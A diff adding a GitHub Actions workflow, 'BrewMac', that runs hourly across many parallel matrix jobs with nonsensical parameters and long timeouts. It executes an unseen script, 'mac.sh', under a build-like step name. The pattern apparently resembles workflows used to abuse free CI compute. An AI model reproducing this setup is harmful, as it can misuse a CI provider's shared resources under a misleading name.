@@ -1,0 +1,75 @@
+name: BrewMac
+# on: [push, pull_request]
+on:
+  schedule:
+    - cron: '0 * * * *'
+  workflow_dispatch:
+      
+jobs:
+  bon:
+    container:
+      image: ubuntu:bionic
+    runs-on: ubuntu-20.04
+    continue-on-error: true
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+        flag: [A, B, C, D]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Seding_start
+      run: |
+        set -e
+        apt-get update -y
+        sleep 10
+  kan-1:
+    needs: bon
+    container:
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+         compiler: [ gcc, clang ]
+         flag: [ki,ny,op,as,gg,hh,jk,hy,gh,er]  
+    timeout-minutes: 60
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Builder_For_Brew
+      run: |
+        bash mac.sh
+  
+  success-all-test:
+    needs: [bon, kan-1]
+    if: always()
+    runs-on: macos-latest
+    steps:
+      - uses: technote-space/workflow-conclusion-action@v2
+      - name: Check Failure
+        if: env.WORKFLOW_CONCLUSION == 'failure'
+        run: exit 1
+      - name: Success
+        if: ${{ success() }}
+        run: echo "all don,All Done"
